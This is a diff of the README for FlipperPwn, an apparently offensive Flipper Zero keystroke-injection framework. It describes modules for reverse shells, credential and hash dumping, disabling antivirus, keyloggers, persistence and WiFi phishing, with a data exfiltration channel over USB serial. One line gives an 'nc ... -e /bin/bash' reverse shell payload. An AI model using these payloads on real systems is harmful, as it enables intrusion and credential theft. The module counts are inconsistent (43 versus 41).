@@ -18,7 +18,7 @@
 
 ---
 
-FlipperPwn is a Metasploit-inspired payload framework that turns Flipper Zero into a USB HID attack platform. Load `.fpwn` modules from an SD card, auto-detect the target OS via LED heuristics, configure options, and execute keystroke injection payloads — all from the Flipper's menu. Optional ESP32 WiFi Dev Board integration adds network scanning, deauth, and evil portal capabilities.
+FlipperPwn is a Metasploit-inspired payload framework (v1.5) that turns Flipper Zero into a full USB HID attack platform. Load `.fpwn` modules from an SD card, auto-detect the target OS via LED heuristics, configure options, and execute keystroke injection payloads — all from the Flipper's menu. 43 built-in modules span recon, credential capture, exploitation, and post-exploitation. The scripting engine supports 80+ DuckyScript-compatible commands including variables with arithmetic, FOR/WHILE loops, IF/ELSE/ENDIF conditionals, INJECT for modular composition, PLATFORM ALL universal sections, mouse HID automation, OS-aware convenience commands (OPEN_TERMINAL, LOCK_SCREEN, SCREENSHOT, clipboard operations), Run Last quick-run, **dual exfiltration channels** (LED covert channel at ~33 bps and USB CDC serial at ~115200 baud), WiFi+HID combined attacks, random payload generation, LED heartbeat during execution, and per-character typing delays for evasion. Optional ESP32 WiFi Dev Board integration adds network scanning, targeted deauth, evil portal credential phishing, PMKID capture, and station enumeration.
 
 > **This tool is for authorized security testing only. See the [Legal Disclaimer](#legal-disclaimer).**
 
@@ -29,6 +29,7 @@ FlipperPwn is a Metasploit-inspired payload framework that turns Flipper Zero in
 - [How It Works](#how-it-works)
 - [OS Detection](#os-detection)
 - [WiFi Dev Board Integration](#wifi-dev-board-integration)
+- [Exfiltration Channels](#exfiltration-channels)
 - [Built-in Modules](#built-in-modules)
 - [Module Format (.fpwn)](#module-format-fpwn)
 - [Metasploit Integration](#metasploit-integration)
@@ -62,7 +63,7 @@ FlipperPwn is a Metasploit-inspired payload framework that turns Flipper Zero in
 6. Execute: the payload opens the appropriate terminal/dialog for the detected OS, types the commands, and establishes access.
 7. Progress is shown live on the Flipper screen. Press **Back** at any time to abort.
 
-Up to **64 modules** can be loaded from the SD card simultaneously. Modules are discovered at startup by scanning `/ext/flipperpwn/modules/` for `.fpwn` files.
+Up to **32 modules** can be loaded from the SD card simultaneously. Modules are discovered at startup by scanning `/ext/flipperpwn/modules/` for `.fpwn` files.
 
 ---
 
@@ -113,47 +114,109 @@ Mixed HID + WiFi modules are supported: a single `.fpwn` file can scan nearby ne
 
 ---
 
+## Exfiltration Channels
+
+FlipperPwn supports two data exfiltration channels for getting command output back from the target to the Flipper:
+
+### LED Covert Channel (`EXFIL`)
+
+The original channel encodes data bit-by-bit using CapsLock (data) and NumLock (clock) LED toggling. The Flipper reads `furi_hal_hid_get_led_state()` at 2 ms intervals. **~33 bits/sec** — slow but requires no driver support and works while the Flipper stays in HID mode.
+
+### USB CDC Serial Channel (`EXFIL_USB`)
+
+**New in v1.5.** High-bandwidth exfiltration via USB CDC virtual serial port at **~115200 baud** — roughly 3400x faster than LED toggling.
+
+**How it works:**
+
+1. **HID Phase:** FlipperPwn types an OS-specific script via HID that runs your command, buffers the output, and polls for a new serial port to appear
+2. **Baked-in Delay:** A configurable pause (default 5s) lets the script run and snapshot existing serial ports
+3. **USB Switch:** Flipper switches from HID to CDC — the target sees a new COM/ttyACM device
+4. **Data Transfer:** The target script finds the new serial port and writes the buffered data + EOT marker
+5. **Restore:** Flipper switches back to HID mode for continued payload execution
+
+**Configurable variables:**
+
+| Variable | Default | Description |
+|---|---|---|
+| `EXFIL_USB_DELAY` | 5000 | Milliseconds to wait before USB switch (min 1000, max 30000) |
+| `EXFIL_USB_TIMEOUT` | 20000 | Receive timeout in milliseconds (min 5000, max 60000) |
+
+**Example module snippet:**
+```
+SET EXFIL_USB_DELAY 5000
+EXFIL_USB hostname
+```
+
+Data is saved to `SD:/flipperpwn/exfil/exfil_usb_<timestamp>.txt` and appended to the run log.
+
+---
+
 ## Built-in Modules
 
-18 modules ship with FlipperPwn, organized into four categories.
+41 modules ship with FlipperPwn, organized into four categories.
 
 ### Recon
 
 | Module | Description |
 |---|---|
-| `sys_info` | Dump OS version, hostname, CPU architecture, and current user |
-| `wifi_enum` | List saved WiFi profiles and their SSIDs (Windows netsh / macOS security) |
-| `network_enum` | Print active network interfaces, IPs, and routing table |
-| `av_detect` | Query running processes and services to fingerprint AV/EDR products |
+| `System Info Recon` | Dump OS version, hostname, CPU architecture, and current user |
+| `Network Recon` | Print active network interfaces, IPs, and routing table |
+| `Full Recon Suite` | Combined system, network, and process enumeration in one pass |
+| `Stealth Recon` | Low-noise recon using living-off-the-land binaries to avoid EDR |
+| `WiFi Recon Full` | Extract saved WiFi profiles and plaintext PSKs from the OS |
+| `OS Fingerprint Script` | LED-heuristic OS probe with result typed into an open text field |
+| `Conditional Recon` | Runs different recon based on variable mode selection |
+| `Quick Recon` | Fast recon using OPEN_TERMINAL and PLATFORM ALL |
+| `Exfil Hostname` | Silently exfiltrates hostname via LED covert channel |
+| `Countdown Timer` | Demo of variable arithmetic and WHILE loops |
+| `User Enumeration` | Enumerate common user directories using FOR loop |
+| `Port Sequence` | Scan well-known ports using variable arithmetic |
 
 ### Credentials
 
 | Module | Description |
 |---|---|
-| `wifi_harvest` | Extract plaintext WiFi PSKs from the OS credential store |
-| `browser_creds` | Dump browser-saved credentials from common profile paths |
-| `ssh_keys` | Locate and exfiltrate SSH private keys from `~/.ssh/` |
-| `fake_login` | Overlay a credential-phishing prompt mimicking an OS auth dialog |
-| `env_dump` | Print environment variables including tokens, keys, and proxy settings |
+| `WiFi Credential Dump` | Extract plaintext WiFi PSKs from the OS credential store (LED) |
+| `WiFi Creds (USB)` | Extract plaintext WiFi PSKs via USB CDC serial (high-bandwidth) |
+| `USB Exfil Test` | Simple hostname exfil to verify the USB CDC pipeline |
+| `Hash Dump` | Invoke credential harvesting to capture NTLM / shadow hashes |
+| `Browser History Dump` | Read and type browser history from common profile paths |
+| `Clipboard Dump` | Read and exfiltrate the current clipboard contents |
+| `SSH Key Dump` | Locate and exfiltrate SSH private keys from `~/.ssh/` |
+| `Evil Portal Phish` | Start an ESP32 evil portal captive page and capture credentials |
+| `SAM Hash Dump` | Exports SAM/SYSTEM hives for offline cracking - Windows only |
+| `PIN Spray` | Tries common 4-digit PINs using FOR loop |
 
 ### Exploit
 
 | Module | Description |
 |---|---|
-| `reverse_shell_tcp` | Establish a reverse TCP shell back to a netcat listener |
-| `reverse_shell_dns` | DNS-tunneled reverse shell for egress-filtered environments |
-| `download_exec` | Download and execute a remote binary via PowerShell / curl / wget |
-| `uac_bypass_fodhelper` | UAC bypass via the fodhelper.exe auto-elevation vector (Windows) |
-| `msfvenom_stager` | Type the fetch-and-execute chain for a Metasploit meterpreter stager |
+| `Attack Chain` | Full multi-stage attack: recon → privilege escalation → persistence |
+| `Reverse Shell` | Establish a reverse TCP shell back to a netcat listener |
+| `Disable Defenses` | Disable Windows Defender and common EDR services via PowerShell |
+| `WiFi Attack Chain` | Scan → deauth → capture PMKID → type results via HID |
+| `Rickroll Beacon` | Spam fake SSIDs and open browser to rickroll URL on target |
+| `UAC Bypass RunAs` | UAC bypass via RunAs auto-elevation vector (Windows) |
+| `Payload Dropper` | Download and execute a remote binary via PowerShell / curl / wget |
+| `Screen Capture` | Takes screenshot using OS-native tools |
+| `Screen Grab` | Minimize windows, screenshot desktop, restore |
+| `Modular Payload Chain` | Chains multiple modules together via INJECT |
+| `USB Wait Deploy` | Dead drop: waits for USB then runs command |
+| `Stealth Typer` | Types commands with per-char delays to evade detection |
+| `Phish Redirect` | Opens a phishing URL in the target's browser |
+| `WiFi Full Attack` | Full WiFi chain: scan → deauth → PMKID → save results |
 
 ### Post-Exploit
 
 | Module | Description |
 |---|---|
-| `persist_schtask` | Install a scheduled task / cron job for persistence |
-| `persist_startup` | Drop a startup entry (registry / launchd / systemd user unit) |
-| `disable_defender` | Disable Windows Defender real-time protection via PowerShell |
-| `add_user` | Create a local administrator account with a configurable password |
+| `Lock Screen` | Immediately lock the target workstation |
+| `Lock and Leave` | Run recon then lock the workstation |
+| `Persistence Install` | Drop a startup entry (registry / launchd / systemd user unit) |
+| `Keylogger Install` | Install a keystroke logger and configure exfiltration |
+| `Random Password Gen` | Generate and type a cryptographically random password |
+| `Mouse Jiggler` | Keeps screen awake via mouse movement - PLATFORM ALL |
+| `Quick Exfil` | Exfil system info to file via PowerShell |
 
 ---
 
@@ -221,13 +284,15 @@ OPTION LHOST 192.168.1.100 "Listener IP"
 STRING nc {{LHOST}} {{LPORT}} -e /bin/bash
 ```
 
-Up to **8 options** per module. Names are case-sensitive.
+Up to **4 options** per module. Names are case-sensitive.
 
 ### Platform Sections
 
 Each `PLATFORM <TAG>` line begins a block of commands executed only on the matching OS. Sections end at the next `PLATFORM` line or EOF. Indentation is optional but recommended for readability.
 
-Supported tags: `WIN`, `MAC`, `LINUX`
+Supported tags: `WIN`, `MAC`, `LINUX`, `ALL`
+
+Use `PLATFORM ALL` for OS-independent commands. If no OS-specific section exists, the engine falls back to `PLATFORM ALL`.
 
 ### Command Reference
 
@@ -269,6 +334,117 @@ Supported tags: `WIN`, `MAC`, `LINUX`
 
 `<key>` can be a single letter, a named key (`ENTER`, `TAB`, `F5`, `SPACE`, etc.), or an arrow key name.
 
+#### Extended Text Commands
+
+| Command | Effect |
+|---|---|
+| `STRINGLN <text>` | Type text then press Enter |
+| `STRING_DELAY <ms> <text>` | Type with per-character delay |
+| `STRINGLN_DELAY <ms> <text>` | Type with per-character delay then press Enter |
+
+#### Key Hold/Release
+
+| Command | Effect |
+|---|---|
+| `HOLD <key>` | Hold a key or modifier down |
+| `RELEASE <key>` | Release a specific held key |
+| `RELEASE` | Release all held keys |
+
+#### LED State Commands
+
+| Command | Effect |
+|---|---|
+| `LED` | Flash green LED |
+| `LED_COLOR <color>` | Flash LED in RED/GREEN/BLUE/YELLOW/CYAN/MAGENTA |
+| `WAIT_FOR_CAPS_ON` | Wait until CapsLock LED is on (30s timeout) |
+| `WAIT_FOR_CAPS_OFF` | Wait until CapsLock LED is off |
+| `WAIT_FOR_NUM_ON` | Wait until NumLock LED is on |
+| `WAIT_FOR_NUM_OFF` | Wait until NumLock LED is off |
+
+#### Timing and Flow Control
+
+| Command | Effect |
+|---|---|
+| `DELAY <ms>` / `SLEEP <ms>` | Pause for milliseconds |
+| `DEFAULTDELAY <ms>` | Set default delay between all commands |
+| `JITTER <min> <max>` | Random delay for anti-detection |
+| `WAIT_BUTTON` | Pause until user presses OK on Flipper |
+| `WAIT_FOR_USB` | Wait until USB HID is connected (30s timeout) |
+| `REPEAT <n>` | Repeat the previous command n times |
+| `REPEAT_BLOCK <n>` / `END_REPEAT` | Loop a block of commands n times |
+| `FOR $VAR = start TO end` / `END_FOR` | Counted loop (supports ascending and descending) |
+| `WHILE $VAR == value` / `END_WHILE` | Loop while condition is true (max 1000 iterations) |
+| `IF_CONNECTED` / `END_IF` | Conditional: skip block if no ESP32 |
+| `IF $VAR == value` / `ELSE` / `END_IF` | Conditional: execute block based on variable comparison (supports == and !=) |
+
+#### Variables
+
+| Command | Effect |
+|---|---|
+| `VAR $name = value` | Define a runtime variable |
+| `SET $name = value` | Set/update a runtime variable |
+| `VAR $X = $X + 1` | Arithmetic: supports +, -, *, /, % operators |
+| Reference with `$name` in STRING/STRINGLN |
+
+#### OS-Aware Convenience Commands
+
+| Command | Effect |
+|---|---|
+| `OPEN_TERMINAL` | Open terminal (cmd / Terminal.app / Ctrl+Alt+T) |
+| `OPEN_POWERSHELL` | Open PowerShell (Win) or admin shell (others) |
+| `OPEN_BROWSER` | Open default browser |
+| `MINIMIZE_ALL` | Minimize all windows (Win+D / Cmd+H+M / Super+D) |
+| `LOCK_SCREEN` | Lock workstation (Win+L / Ctrl+Cmd+Q / Super+L) |
+| `SCREENSHOT` | Take screenshot (Win+Shift+S / Cmd+Shift+3 / PrintScreen) |
+| `CLOSE_WINDOW` | Close active window (Alt+F4 / Cmd+W) |
+| `TASK_MANAGER` | Open task manager/activity monitor |
+| `SELECT_ALL` | Select all (Ctrl+A / Cmd+A) |
+| `COPY` / `CUT` / `PASTE` | Clipboard operations (OS-aware modifier) |
+| `UNDO` / `REDO` | Undo/redo (OS-aware modifier) |
+| `FIND` | Open find dialog (Ctrl+F / Cmd+F) |
+| `SAVE` | Save (Ctrl+S / Cmd+S) |
+| `BROWSE_URL <url>` | Open a specific URL in the default browser |
+| `OPEN_NOTEPAD` | Open text editor (Notepad / TextEdit / gedit) |
+| `PRINT <text>` | Display message on Flipper screen during execution |
+
+#### Mouse HID Commands
+
+| Command | Effect |
+|---|---|
+| `MOUSE_MOVE <dx> <dy>` | Move mouse by delta (-127 to 127) |
+| `MOUSE_CLICK [LEFT\|RIGHT\|MIDDLE]` | Click and release (default LEFT) |
+| `MOUSE_PRESS [LEFT\|RIGHT\|MIDDLE]` | Press without releasing (for drag) |
+| `MOUSE_RELEASE [LEFT\|RIGHT\|MIDDLE]` | Release a held button |
+| `MOUSE_SCROLL <delta>` | Scroll wheel (-127 to 127) |
+
+#### Module Composition
+
+| Command | Effect |
+|---|---|
+| `INJECT <filename>` | Execute another .fpwn file inline (max depth 4) |
+
+#### Random Generation
+
+| Command | Effect |
+|---|---|
+| `RANDOM_STRING <length>` | Type random alphanumeric chars (max 64) |
+| `RANDOM_INT <min> <max>` | Type a random integer |
+
+#### Special Commands
+
+| Command | Effect |
+|---|---|
+| `ALTCODE <code>` | Type via Windows ALT+numpad entry |
+| `SYSRQ <key>` | Linux Magic SysRq key combo |
+| `TYPE_FILE <filename>` | Type contents of SD card file as keystrokes |
+
+#### Data Exfiltration
+
+| Command | Effect |
+|---|---|
+| `EXFIL <command>` | Run command, exfil output via CapsLock/NumLock LED toggling (~33 bps) |
+| `EXFIL_USB <command>` | Run command, exfil output via USB CDC serial (~115200 baud) |
+
 #### WiFi Commands (requires ESP32)
 
 | Command | Description |
@@ -276,6 +452,16 @@ Supported tags: `WIN`, `MAC`, `LINUX`
 | `WIFI_SCAN` | Trigger an AP scan on the ESP32 |
 | `WIFI_JOIN <ssid> <pass>` | Connect to a network |
 | `WIFI_DEAUTH <bssid>` | Send deauth frames to target AP |
+| `WIFI_DEAUTH_TARGET <SSID>` | Targeted deauth against specific AP |
+| `WIFI_BEACON` | Beacon spam (fake SSIDs) |
+| `WIFI_PORTAL <SSID>` | Start evil portal captive page |
+| `WIFI_SNIFF_PMKID` | Capture PMKID handshakes |
+| `WIFI_HANDSHAKE` | WPA handshake capture via deauth |
+| `WIFI_SCAN_STA` | Scan associated client stations |
+| `WIFI_PROBE <ms>` | Sniff probe requests |
+| `WIFI_STA_RESULT` | Type station scan results as keystrokes |
+| `WIFI_STOP` | Stop any active WiFi operation |
+| `SAVE_WIFI` | Save all WiFi results to SD card |
 | `PING_SCAN <subnet>` | ICMP sweep (e.g., `192.168.1.0/24`) |
 | `PORT_SCAN <host>` | TCP connect scan on common ports |
 | `WIFI_RESULT` | Type the last scan result as HID keystrokes |
